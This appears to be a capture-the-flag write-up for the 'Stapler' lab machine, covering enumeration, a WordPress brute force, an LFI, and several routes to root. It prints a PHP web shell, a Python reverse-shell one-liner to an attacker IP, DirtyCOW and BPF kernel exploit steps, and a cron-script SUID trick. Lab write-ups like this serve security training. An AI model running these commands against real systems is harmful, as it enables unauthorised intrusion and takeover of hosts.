# Stapler

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.148
```

Open ports discovered:

- **21** — FTP (vsftpd 2.0.8 or later, anonymous login allowed)
- **22** — SSH (OpenSSH 7.2p2 Ubuntu 4, protocol 2.0)
- **53** — DNS (tcpwrapped)
- **80** — HTTP (PHP CLI server 5.5 or later)
  - `http://192.168.149.148/.bashrc`
  - `http://192.168.149.148/.profile`
- **139** — SMB (Samba 4.3.9-Ubuntu)
  - `IPC$` — IPC Service
  - `kathy` — "Fred, What are we doing here?"
  - `print$` — Printer Drivers
  - `tmp` — "All temporary files should be stored here"
- **666** — Doom (tcpwrapped)
- **3306** — MySQL (MySQL 5.7.33-0ubuntu0.16.04.1)
- **12380** — HTTP (Apache httpd 2.4.18, Ubuntu, SSL)
  - `http://192.168.149.148:12380/.well-known`
  - `http://192.168.149.148:12380/_install.aspx`
  - `http://192.168.149.148:12380/administrivia.txt`
  - `http://192.168.149.148:12380/affiliates.jsp`
  - `http://192.168.149.148:12380/agenda.html`
  - `http://192.168.149.148:12380/africa.aspx`
  - `http://192.168.149.148:12380/affiliate_info.asp`
  - `http://192.168.149.148:12380/agb.asp`
  - `http://192.168.149.148:12380/agent.html`
  - `http://192.168.149.148:12380/anuncios.php`
  - `http://192.168.149.148:12380/app_code.jsp`
  - `http://192.168.149.148:12380/applet.txt`
  - `http://192.168.149.148:12380/apps.html`
  - `http://192.168.149.148:12380/architecture.txt`
  - `http://192.168.149.148:12380/auction.txt`
  - `http://192.168.149.148:12380/award.txt`
  - `http://192.168.149.148:12380/av.html`
  - `http://192.168.149.148:12380/automatic.aspx`
  - `http://192.168.149.148:12380/avatar.php`

A follow-up `nmap` scan with service version detection and TCP connect confirms port 53 and 666 as `tcpwrapped`, and port 12380 fingerprinted as HTTPS. A full port scan reveals all ports open or closed as expected.

### FTP enumeration

Connect to FTP anonymously:

```
ftp anonymous@192.168.149.148
```

The FTP banner references `Harry`. Download the `note` file:

```
ftp> get note
cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

Possible usernames: `harry`, `elly`, `john`.

### SMB enumeration

Run `enum4linux-ng` to enumerate SMB users:

```
enum4linux-ng 192.168.149.148 -A -Gm -R -t 15
```

Numerous Unix users are discovered via RID cycling, including `peter`, `elly`, `jamie`, `sam`, `drew`, `jess`, `SHayslett`, `Taylor`, `mel`, `kai`, `zoe`, `NATHAN`, `www`, `ubuntu`, and many more.

### Port 666 — ZIP archive

Connecting to port 666 returns binary data. Save it and inspect:

```
nc -nv 192.168.149.148 666 > 666_out
file 666_out
666_out: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Jun 03 2016 16:03:08, uncompressed size 12821, method=deflate
```

Extract the ZIP archive containing `message2.jpg`. The image contains a cookie hint, and `exiftool` reveals an IPTC contact field: "If you are reading this, you should get a cookie!"

### WordPress on port 12380

Directory busting on `https://192.168.149.148:12380` reveals:

- `https://192.168.149.148:12380/blogblog/` — WordPress site
- `https://192.168.149.148:12380/admin112233/`
- `https://192.168.149.148:12380/phpmyadmin/`

Browse to `https://192.168.149.148:12380/blogblog/?p=14`. A post written by John Smith includes the tag "I run this place," suggesting `john` is the admin account.

Run `wpscan` to enumerate users:

```
wpscan --url https://192.168.149.148:12380/blogblog/ -e u --disable-tls-checks
```

Eleven users discovered: `John Smith`, `barry`, `john`, `elly`, `peter`, `heather`, `garry`, `harry`, `kathy`, `tim`, `scott`.

Brute force the `john` account:

```
wpscan --url https://192.168.149.148:12380/blogblog/ --usernames john --passwords /usr/share/wordlists/rockyou.txt -t 100 --disable-tls-checks
...
[SUCCESS] - john / incorrect
```

Login as `john` at `https://192.168.149.148:12380/blogblog/wp-login.php` using `john:incorrect`.

Attempt to edit the Hello Dolly plugin with a PHP reverse shell — missing a save button. Attempt to upload a PHP reverse shell via the media uploader — rejected due to file type. Upload the PHP reverse shell with a `.jpg` extension appended — the file is saved but only opens as a JPG.

Upload a PHP reverse shell via the plugin upload page at `https://192.168.149.148:12380/blogblog/wp-admin/update.php?action=upload-plugin`. The hostname is `192.168.149.148`, FTP credentials are `anonymous:anonymous`, and the connection type is FTP.

Browse to `https://192.168.149.148:12380/blogblog/wp-content/uploads/reverse_shell.php` to trigger the reverse shell, caught with `penelope`:

```
www-data@lab-pg-ubuntu16-stapler-242-099:/$ whoami
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-ubuntu16-stapler-242-099:/$ find / -name local.txt 2>/dev/null
/home/local.txt

www-data@lab-pg-ubuntu16-stapler-242-099:/$ cat /home/local.txt
26daf7beab83e67d02e9e1551c56790f
```

### Alternative Initial Access — WordPress LFI + MySQL

The WordPress site on port 12380 runs the Advanced Video Embed plugin, which is vulnerable to local file inclusion (LFI). The exploit URL is:

```
curl -k "https://192.168.149.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php"
```

This reads the contents of `wp-config.php` and saves them as a `.jpg` file in the uploads directory. Download and inspect the file to obtain MySQL credentials:

```
mysql --user=root --password=plbkac --host=192.168.149.148
```

The MySQL credentials `root:plbkac` can be used in two ways:

1. **phpMyAdmin access** — Log in at `https://192.168.149.148:12380/phpmyadmin/` to enumerate databases and WordPress admin credentials. Credit: [Wen Bin — Write-up for Stapler: 1 – A Different Path](https://kongwenbin.wordpress.com/2018/04/30/write-up-for-stapler-1-a-different-path/)

2. **MySQL outfile web shell** — Use `SELECT ... INTO OUTFILE` to write a PHP web shell to the WordPress uploads directory:

   ```
   SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
   ```

   Browse to `https://192.168.149.148:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami` to confirm code execution, then trigger a reverse shell:

   ```
   cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.15.153”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
   ```

   Credit: [Mitch Moser — Stapler pt. 2: Webshells & Cronjobs](https://infosecwriteups.com/stapler-pt-2-webshells-cronjobs-549b13dbf3d3)

### Alternative Initial Access — SMB enumeration + Hydra brute force

SMB enumeration via `enum4linux-ng` reveals a large list of Unix users through RID cycling. Save the usernames to a file and use `hydra` with the `-e nsr` flag to check for null passwords, username-as-password, and reverse-username-as-password:

```
hydra -L users.txt -e nsr 192.168.149.148 ftp
```

This yields credentials for `SHayslett` (password: `SHayslett`). Log in via FTP as `SHayslett` and download a `passwd` file containing additional usernames. Filter the list to users with a login shell, then re-run `hydra` against SSH with the same `-e nsr` flag:

```
hydra -L users.txt -e nsr ssh://192.168.149.148
```

This yields a login as `SHayslett` via SSH, providing the `local.txt` flag.

Credit: [Mitch Moser — Stapler pt. 1: Root with just Enumeration](https://infosecwriteups.com/stapler-pt-1-c9a14793eb3)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
python3 -m http.server 9001
```

On the target, download the script:

```
www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ wget http://192.168.45.189:9001/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ ./linpeas.sh
```

Important findings:

```
═╣ Operating system ............. Linux
═╣ Kernel release ............... 4.4.0-21-generic
═╣ Comparable version ........... 4.4.0.21

CVE: CVE-2016-5195 | Name: dirtycow | Match data: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3 | Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04 | Rank: 4
```

Compile and run the DirtyCOW exploit:

```
gcc --static DirtyCOW-cve-2016-5195.c -o DirtyCOW_32 -m32 -lcrypt

www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ chmod +x DirtyCOW_32
www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ ./DirtyCOW_32
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
```

Gain a privileged shell:

```
www-data@lab-pg-ubuntu16-stapler-242-099:/tmp$ su
Password: root

firefart@lab-pg-ubuntu16-stapler-242-099:/tmp# whoami
firefart
firefart@lab-pg-ubuntu16-stapler-242-099:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Retrieve the `proof.txt` flag:

```
firefart@lab-pg-ubuntu16-stapler-242-099:/tmp# cd /root
firefart@lab-pg-ubuntu16-stapler-242-099:~# cat proof.txt
9c593eaa672cd1eabc470f8c308cba59
```

### Alternative Privilege Escalation — writable cron script

The file `/usr/local/sbin/cron-logrotate.sh` is world-writable and executed by root every 5 minutes. Append a command to create a SUID copy of `bash`:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/sbin/cron-logrotate.sh
```

Wait for the cron job to fire, then execute the SUID binary:

```
/tmp/bash -p
# whoami
root
```

Credit: [Rajveer Singh Sisodiya — Stapler Proving Grounds Play Writeup](https://medium.com/@rajveersinghsisodiya329/stapler-proving-grounds-practice-writeup-417b43418964)

### Alternative Privilege Escalation — credentials in .bash_history

The user `JKanode`'s `.bash_history` file contains SSH credentials used with `sshpass`:

```
sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 peter@localhost
```

The password `JZQuyIN5` works for the user `peter`. The `peter` account has `sudo` privileges:

```
peter@lab-pg-ubuntu16-stapler-242-099:~$ sudo -l
peter@lab-pg-ubuntu16-stapler-242-099:~$ sudo su
root@lab-pg-ubuntu16-stapler-242-099:~# whoami
root
```

Credit: [jckhmr — Stapler Vulnhub Writeup](https://jckhmr.net/stapler-vulnhub-writeup)

### Alternative Privilege Escalation — BPF double-fdput (CVE-2016-8655)

The kernel `4.4.0-21-generic` is vulnerable to the BPF `double-fdput()` privilege escalation (CVE-2016-8655). Download and compile the exploit:

```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

The exploit creates a SUID root shell automatically:

```
www-data@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root)
```

Credit: [jckhmr — Stapler Vulnhub Writeup](https://jckhmr.net/stapler-vulnhub-writeup)
